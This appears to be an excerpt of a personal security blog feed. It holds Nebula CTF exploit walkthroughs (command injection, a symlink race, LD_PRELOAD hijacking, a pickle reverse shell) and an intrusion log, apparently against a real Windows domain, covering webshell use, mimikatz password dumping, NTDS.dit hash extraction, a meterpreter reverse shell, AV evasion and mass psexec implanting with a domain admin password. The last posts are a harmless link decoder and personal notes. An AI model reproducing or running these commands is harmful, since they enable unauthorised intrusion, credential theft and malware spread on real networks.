&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;x09-level09&quot;&gt;0x09 level09&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mykey:
    vi /tmp/level09.txt
    ----content----
    [email {${system($use_me)}}]
    -----end-------
    cd /home/flag09
    ./flag09 /tmp/level09.txt getflag
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;x10-level10&quot;&gt;0x10 level10&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mykey:
    vi /tmp/level10_1
    ----conent------
    #!/bin/sh
    while true;
    do
        ln -sf /tmp/level10_2 /tmp/level10_3
        ln -sf /home/flag10/token /tmp/level10_3
    done
    ----end---------
    touch /tmp/level10_2
    touch /tmp/level10_3
    chmod +x /tmp/level10_1
    vi /tmp/level10_11
    ------content------
    #!/bin/sh
    while true;
    do
        /home/flag10/flag10 /tmp/level10_3 192.168.2.140
    done
    -----end-----------
    chmod +x /tmp/level10_3
    use another terminal:
        nc -lv 18211
    use another terminal:
        ssh level10@192.168.2.140
        pass:level10
        /tmp/level10_1
    use another terminal:
        ssh level10@192.168.2.140
        pass:level10
        /tmp/level10_11
    find the terminal with nc -lv 18211 received the content of token
    su - flag10
    pass:content of token
    getflag
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;x11-level11&quot;&gt;0x11 level11&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mykey:
    there are two ways:
        (http://blackndoor.com/nebula-level11/)
        (https://github.com/join-us/exploit-exercises/blob/master/Nebula/level11.md)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;x12-level12&quot;&gt;0x12 level12&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mykey:
    nc 127.0.0.1 50001
    Pass:
        test;getflag &amp;gt; /tmp/level12
    vi /tmp/level12
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;x13-level13&quot;&gt;0x13 level13&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mykey:
    vi /tmp/level13.c
    -----content-------
    #include &amp;lt;sys/types.h&amp;gt;
    int getuid(void)
    {
        return 1000; 
    }
    -------------------
    gcc -shared -fPIC /tmp/level13.c -o /tmp/level13.so
    LD_PRELOAD=&quot;/tmp/level13.so&quot;
    export LD_PRELOAD
    cp /home/flag13/flag13 /home/level13/
    /home/level13/flag13
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;x14-level14&quot;&gt;0x14 level14&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mykey:
--------py--------
def main(string):
    length=len(string)
    out=&quot;&quot;
    for i in range(length):
	#print type(chr(ord(string[length-1-i])-(length-1-i)))
	#print chr(ord(string[length-1-i])-(length-1-i))[0]
        out+=(chr(ord(string[length-1-i])-(length-1-i))[0])
    return out
if __name__==&#39;__main__&#39;:
    import sys
    print main(sys.argv[1])
------------------
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;x15-level15&quot;&gt;0x15 level15&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    cd /home/flag15
    strace ./flag15
        found one line:open(&quot;/var/tmp/flag15/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory) 
    vi /var/tmp/flag15/exploit.c
    ------------exploit.c-----------
    #include &amp;lt;unistd.h&amp;gt;
    int __libc_start_main(int (*main) (int, char * *, char * *), int argc, char * * ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end)) {
        execl(&quot;/bin/getflag&quot;, (char *)NULL, (char *)NULL);
    }
    --------------------------------
    cd /var/tmp/flag15
    gcc -g -fPIC -c exploit.c (-g===&amp;gt;for gdb,-c===&amp;gt;产生目标文件,不产生可执行文件)
    ll
        exploit.c
        exploit.o
    gcc exploit.o -shared -o libc.so.6
    /home/flag15/flag15
       relocation error: /var/tmp/flag15/libc.so.6: symbol __cxa_finalize, version GLIBC_2.1.3 not defined in file libc│[~] [~] [~]                                                                  
       .so.6 with link time reference
    vi verscript
    ---verscript-----
    GLIBC_2.0{
    global:__libc_start_main;
    local: *;
    };
    -----------------
    gcc -shared -Wl,--version-script,verscript,-Bstatic -static-libgcc -o libc.so.6 exploit.o
    /home/flag15/flag15
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;x16-level16&quot;&gt;0x16 level16&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mykey:
    vi /tmp/exp.sh
    ----content-----
    /bin/getflag&amp;gt;&amp;gt;/tmp/level16.out
    ----------------
    another terminal:
        nv -lv 1616
    origin terminal:
        wget http://localhost:1616/index.cgi?username=%22%3C%2FDEV%2FNULL%3BP%3D%2FTMP%2FEXP.SH%3B%24{P%2C%2C}%3B%23&amp;amp;password=
            urldecode:   &quot;&amp;lt;/DEV/NULL;P=/TMP/EXP.SH;${P,,};#
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;x17-level17&quot;&gt;0x17 level17&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mykey:
    vi /root/桌面/1.py
    -----1.py-----
    #!/usr/bin/python
    import socket
    
    HOST = &#39;192.168.2.147&#39;
    PORT = 10007
    
    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    sock.connect((HOST,PORT))
    
    recv = sock.recv(1024)
    print &quot;Receive : %s\n&quot; % recv
    
    exploit = &quot;cos\nsystem\n(S&#39;/bin/bash -i&amp;gt;&amp;amp; /dev/tcp/192.168.3.106/51242 0&amp;gt;&amp;amp;1&#39;\ntR.\n&quot;
    
    sock.send(exploit)
    recv = sock.recv(2048)
    -----end------

    nc -lvp 51242
    python /root/桌面/1.py

    receive a new shell with ruid=flag17
        &amp;gt;getflag
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;x18-level18&quot;&gt;0x18 level18&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mykey:
    python -c &#39;print &quot;login iii\r\n&quot;*50+&quot;closelog\r\n&quot;+&quot;shell\r\n&quot;&#39; | /home/flag18/flag18 --rcfile -d log -v -v -v
    out:&#39;Starting can not find&#39;
        ... can not find
        ... can not find
    cd /home/flag18
    vi log
    -----content------
    Starting up. ......
    something ....
    ------end---------

    vi /tmp/Starting
    ----Starting---
    /bin/flag &amp;gt; /tmp/level18.out
    -----end-------
    
    *****attention:*****
    not not forget to:
    chmod +x /tmp/Starting
    *******end*******

    python -c &#39;print &quot;login iii\r\n&quot;*50+&quot;closelog\r\n&quot;+&quot;shell\r\n&quot;&#39; | /home/flag18/flag18 --rcfile -d log -v -v -v
    vi /tmp/level18.out

link knowledge:
    http://v0ids3curity.blogspot.kr/2012/09/exploit-exercise-improper-file-handling.html
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;x19-level19&quot;&gt;0x19 level19&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mykey:
    on kali(192.168.3.106)
        vi /tmp/level19.c
        ------------level19.c-------------
        #include &amp;lt;stdio.h&amp;gt;
        #include &amp;lt;stdlib.h&amp;gt;
        #include &amp;lt;unistd.h&amp;gt;
        #include &amp;lt;time.h&amp;gt;
        #include &amp;lt;sys/types.h&amp;gt;
        int main(void)
        {
            pid_t pid;
            char* args[]={&quot;/bin/sh&quot;,&quot;-c&quot;,&quot;getflag &amp;gt; /tmp/level19.out&quot;,NULL};
            pid=fork();
            if (pid==0)
            {
                nice(19);
                execve(&quot;/home/flag19/flag19&quot;,args,NULL);
            }
            else if (pid&amp;lt;0)
            {
                 printf(&quot;Ups\n&quot;);
            }
            else
            {
                 exit(1);
            }
            return 0;
        }
        --------------end---------------
        
        gcc -o /tmp/level19 /tmp/level19.c
        scp /tmp/level19 level19@192.168.2.147:/home/level19
        ll(find &quot;x&quot; in /home/level19/level19,could be executed)
        ssh level19@192.168.2.147
        pass:level19
        cd /home/level19
        ./level19
        out:binary can not be executed

        back to kali(192.168.3.106)
        scp /tmp/level19.c level19@192.168.2.147:/home/level19/
        
        ssh level19@192.168.2.147
        pass:level19
        cd /home/level19
        gcc -o level19-1 level19.c
        chmod +x level19-1
        ./level19-1

        vi /tmp/level19.out
            succeed

link knowledge:
    http://www.cnblogs.com/bastard/archive/2012/08/31/2664896.html
    http://www.cnblogs.com/mydomain/archive/2011/09/27/2193247.html
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Thu, 19 May 2016 00:00:00 +0800</pubDate>
        <link>/linux/2016/05/19/nebula/</link>
        <guid isPermaLink="true">/linux/2016/05/19/nebula/</guid>
        
        <category>privilege escalation</category>
        
        <category>linux</category>
        
        
        <category>linux</category>
        
      </item>
    
      <item>
        <title>windows 2008 domain controllers</title>
        <description>&lt;h3 id=&quot;x01-upload-backup-webshells&quot;&gt;0x01 upload backup webshells&lt;/h3&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.there exists a webshell upload by someone else:https://xx.oo.xx/owa/auth/error1.aspx
2.webshell in different folder has different privileges
    https://xx.oo.xx/aspnet_client/system_web/2_0_50727/some.aspx      C:\inetpub\wwwroot\&amp;gt; whoami ---&amp;gt; iis apppool\defaultapppool
    https://xx.oo.xx对应C:\inetpub\wwwroot\      目录下（index.html）   iis权限
    https://xx.oo.xx/owa/auth/some.aspx    C:\inetpub\wwwroot\&amp;gt; whoami ---&amp;gt; nt authority\system
    https://xx.oo.xx/owa/对应C:\Program Files\Microsoft\Exchange Server\V14\ClientAccess\Owa\ 目录 system权限
3.upload a strong webshell but found &quot;/&quot; error
    aspx大马连接报错&quot;/&quot;解决方法:http://www.asp-muma.com/?post=97
    my way defferent from uppon one:
    create a new folder,create a web.config file with below content:
    --------------------------content------------------------
    &amp;lt;configuration&amp;gt;
        &amp;lt;system.web&amp;gt;
            &amp;lt;customErrors mode=&quot;Off&quot;/&amp;gt;
        &amp;lt;/system.web&amp;gt;
    &amp;lt;/configuration&amp;gt;
    --------------------------end of content----------------
    then upon a strong webshell to my new created folder,found no more error.
4.different parse 
    C:\Program Files\Microsoft\Exchange Server\V14\ClientAccess\Owa\xxoo\xxoo\大马.aspx is ok to parse
    C:\Program Files\Microsoft\Exchange Server\V14\ClientAccess\Owa\xxoo\xxoo\一句话.aspx is not ok to parse
    C:\Program Files\Microsoft\Exchange Server\V14\ClientAccess\Owa\一句话.aspx is ok to parse
    C:\Program Files\Microsoft\Exchange Server\V14\ClientAccess\Owa\auth\一句话.aspx is ok to parse
    C:\inetpub\wwwroot\大马.aspx is not ok to parse before my &quot;adding a new web.config&quot; way in upon 3
    C:\inetpub\wwwroot\一句话.aspx is ok to parse,with iis pri
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x02-find-domain-controllers-and-dc-administrator-username--password&quot;&gt;0x02 find domain controllers and dc administrator username &amp;amp; password&lt;/h3&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://drops.wooyun.org/tips/421 
    dsquery server(best)
    nslookup -type=SRV _ldap._tcp.baidu.com(baidu.com is a domain name,others should be like xxx.org.xx)
    netdom query fsmo

mimikatz
    log
    privilege::debug
    sekurlsa::logonpasswords

at 23:0 /every:m,t,w,th,f,s,su &quot;d:\1.bat&quot;
d:\1.bat:
&quot;C:\recycler\srclog.exe&quot; -w &amp;gt;&amp;gt; &quot;C:\recycler\test.txt&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x03-get-all-hashs-in-the-domain-controllers-machine&quot;&gt;0x03 get all hashs in the domain controllers machine&lt;/h3&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;link a:
    http://drops.wooyun.org/tips/6617
link b:
    https://blogs.msdn.microsoft.com/adioltean/2005/01/05/script-recipe-of-the-week-how-to-copy-an-opened-file/
*attention*:
    in link a,the script name to use shadowcopy is vsshadow.exe
    in link b,the script name to use shadowcopy is vshadow.exe
I get vshadow.exe from installing https://www.microsoft.com/en-us/download/confirmation.aspx?id=23490,then search vshadow.exe in the system,this is a quick link:
    http://pan.baidu.com/s/1cMC07W
there are three files:shadowcopy_ntds.bat,quarkspwdump.exe(v0.2b),vshadow.exe
step0:
    upload these three files to target machine&#39;s folder,eg. c:\windows\myfolder\
step1:
    shadowcopy_ntds.bat c:\windows\ntds\ntds.dit c:\windows\myfolder\ntds.dit
    (this shadowcopy_ntds.bat is from link b,it can copy any file while the file is being used)
step2:
    esentutl /p /o ntds.dit
step3:
    QuarksPwDump.exe --dump-hash-domain -with-history -nt c:\windows\ntds\ntds.dit -o c:\windows\myfolder\log.txt
    (or quarkspwdump.exe --dump-hash-domain -hist -nt c:\windows\ntds\ntds.dit -o c:\windows\myfolder\log.txt)
    the origin commands from link a is &quot;QuarksPwDump.exe -dhb -hist -nt ntds.dit -o log.txt&quot;,which proved wrong with my quarkspwdump.exe file
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x04-get-a-meterpreter-reverse-shell&quot;&gt;0x04 get a meterpreter reverse shell&lt;/h3&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.found windows firewall is not open on the target,but &quot;in/out rules exists&quot;
2.found reverse port like 200 can not get it successfully
3.can not find why the meterpreter shell can not reverse connecting msf successfully
4.do these to get meterpreter reverse shell
    target:run reverse_shell.exe(set reverse port to 53)
    vps:lcx -listen 300 53
    local pc:msf--&amp;gt;set lport 300--&amp;gt;set rhost vps&#39;s ip
5.found 53 is ok
6.better to use shellter to supass avkiller
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x05-&quot;&gt;0x05 批量种马&lt;/h3&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1&amp;gt;psexec.exe @pc.txt -u ABIMAQ\Administrator -p k78m90 -c c:\recycler\putty.exe
2&amp;gt;msf
    use exploit/windows/smb/psexec
    set EXE::Custom /root/桌面/putty.exe
    set RHOST -&amp;gt; use armitage to choose pc.txt(192.168.11.1,192.168.11.2,etc)
    exploit
3&amp;gt;msf seems better than psexec.exe
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Mon, 09 May 2016 00:00:00 +0800</pubDate>
        <link>/web/2016/05/09/windows-2008-domain-controllers/</link>
        <guid isPermaLink="true">/web/2016/05/09/windows-2008-domain-controllers/</guid>
        
        <category>doamin controllers</category>
        
        <category>inside network</category>
        
        <category>aspx</category>
        
        <category>exchange server</category>
        
        <category>outlook</category>
        
        
        <category>web</category>
        
      </item>
    
      <item>
        <title>迅雷加密链接批量转化</title>
        <description>&lt;p&gt;将thunder://….的link转化成可以在迅雷中直接下载的link,eg.ftp://…&lt;br /&gt;
that is:&lt;br /&gt;
thunder://…  ==&amp;gt;  ftp://… or something else&lt;br /&gt;
用于手机迅雷下载vedio时wifi下载速度不快，将手机迅雷中的相应下载link放到pc端下载.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
    &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;re&lt;/span&gt;
    &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;base64&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;get_pure_list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;pure_list&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;each&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;each&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;re&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sub&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;r&#39;(&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s)&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;each&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;pure_list&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;each&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;c&quot;&gt;#re.sub(r&#39;\r\n&#39;,&quot;&quot;,each)&lt;/span&gt;
            &lt;span class=&quot;c&quot;&gt;#re.sub(r&#39;\n&#39;,&quot;&quot;,each)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pure_list&lt;/span&gt;
        
    &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1.txt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;r+&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;all&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;readlines&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;all_pure&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get_pure_list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;all&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;all_pure&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;thunder://&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;all_pure&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;each&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:]:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;2.txt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;a+&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;decode_link&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;base64&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decodestring&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;each&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;decode_link&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode_link&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;__main__&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Sun, 08 May 2016 00:00:00 +0800</pubDate>
        <link>/python/2016/05/08/thunder/</link>
        <guid isPermaLink="true">/python/2016/05/08/thunder/</guid>
        
        <category>auxilary</category>
        
        <category>python</category>
        
        
        <category>python</category>
        
      </item>
    
      <item>
        <title>idea</title>
        <description>&lt;p&gt;渗透导图：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;line1&amp;gt; 不断探索目标全面情报------&amp;gt; 找出漏洞
line2&amp;gt; 不断提升自己核心单点打击力------&amp;gt; 如针对一个应用挖洞，让它成为自己的武器
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;高阶成事导图：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                    放弃 (eg.比较好玩的方向,诱惑)
                     |
                     |
                     |
                  决定方向(挖洞牛中的渗透牛and核心竞争力是在渗透中挖洞)
                     |
                     |
                     |
                  进步飞快
                     |
                     |
                     |
    &quot;他到底承受了多少，才能到这个水平&quot;&amp;lt;博人传&amp;gt;
        &quot;吃得苦中苦，方为人上人&quot;&amp;lt;欢乐颂&amp;gt;
                     |
                     |
                     |
                  进步飞快
                     |
                     |
                     |
                   peak
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;when feel puzzled,read these to find what you are and where you want to go:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; 1.http://drops.wooyun.org/pentesting/15117
 2.http://www.zhihu.com/question/31905047
 3.http://pan.baidu.com/s/1kUUmxWN
 4.http://www.freebuf.com/news/special/105758.html
 5.http://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script/
 6.http://www.2cto.com/Article/201204/127836.html
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;good habit:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.闲时挖洞
2.6 items in cellphone dock:
    知乎 feedly ihour 新浪微博 twitter English_words
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Thu, 21 Apr 2016 00:00:00 +0800</pubDate>
        <link>/idea/2016/04/21/idea/</link>
        <guid isPermaLink="true">/idea/2016/04/21/idea/</guid>
        
        <category>web</category>
        
        <category>idea</category>
        
        <category>thoughts</category>
        
        
        <category>idea</category>
        
      </item>
    
      <item>
        <title>backup files</title>
        <description>&lt;p&gt;1&amp;gt;firefox extensions list
&lt;img src=&quot;https://raw.githubusercontent.com/xinghuacai/pic/master/backup/extension.png&quot; alt=&quot;extension&quot; /&gt;&lt;/p&gt;

&lt;p&gt;2&amp;gt;sublime text setup file&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://pan.baidu.com/s/1o7Tyha6
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;3&amp;gt;firefox bookmarks&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://pan.baidu.com/s/1jHCBs6y
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;4&amp;gt;vimrc and bundles of vim&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://pan.baidu.com/s/1slFveFF
update:2016-06-07
    http://pan.baidu.com/s/1hsbKyUS
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;5&amp;gt;zshrc&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://pan.baidu.com/s/1o7X4zr0
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;6&amp;gt;tmux&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://pan.baidu.com/s/1kVyETT1
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;7&amp;gt;vim+zshrc+tmux&lt;/p&gt;

